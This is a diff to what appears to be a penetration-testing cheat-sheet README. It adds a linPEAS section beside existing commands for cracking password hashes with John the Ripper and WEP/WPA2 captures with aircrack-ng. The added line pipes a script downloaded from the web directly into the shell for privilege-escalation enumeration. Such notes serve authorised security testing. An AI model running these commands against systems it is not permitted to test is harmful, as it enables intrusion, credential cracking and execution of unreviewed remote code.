@@ -103,6 +103,11 @@ john secret.txt --format=raw-md5
 aircrack-ng WEPooo.cap
 aircrack-ng WPA2ooo.cap -w /usr/share/wordlists/nmap.lst
 ```
+## _linPEAS_
+
+```sh
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
 ## License
 
 MIT
